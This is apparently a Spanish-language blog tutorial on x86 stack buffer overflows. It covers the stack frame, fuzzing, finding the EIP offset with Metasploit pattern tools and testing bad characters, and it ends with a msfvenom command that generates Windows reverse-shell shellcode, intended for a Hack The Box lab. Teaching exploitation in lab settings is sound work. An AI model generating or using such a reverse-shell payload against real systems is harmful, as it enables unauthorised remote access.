---
title: "Buffer Overflow en x86: desde cero hasta shellcode"
excerpt: "Explicación práctica con ejemplos en 32-bit, debugging con GDB y técnicas básicas de explotación."
category: Técnico
---

El Buffer Overflow es uno de esos conceptos que suena intimidante hasta que lo ves en acción. Vamos paso a paso.

## ¿Qué es un Buffer Overflow?

Cuando un programa copia datos en un buffer sin verificar su tamaño, puede sobrescribir regiones de memoria adyacentes — incluyendo la dirección de retorno de una función.

```
Stack frame:
[ buffer (100 bytes) ][ EBP ][ EIP ] <-- lo que queremos controlar
```

## Proceso completo

### 1. Fuzzing — encontrar el crash

```python
buf = b"A" * offset
```

### 2. Controlar EIP

Con `pattern_create` y `pattern_offset` de Metasploit encontramos el offset exacto.

### 3. Bad chars

Enviamos todos los bytes del `\x00` al `\xff` y observamos cuáles corrompen el payload.

### 4. Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00" -f python
```

---

En el próximo post veremos cómo aplicar esto en un entorno real con una máquina de HTB.
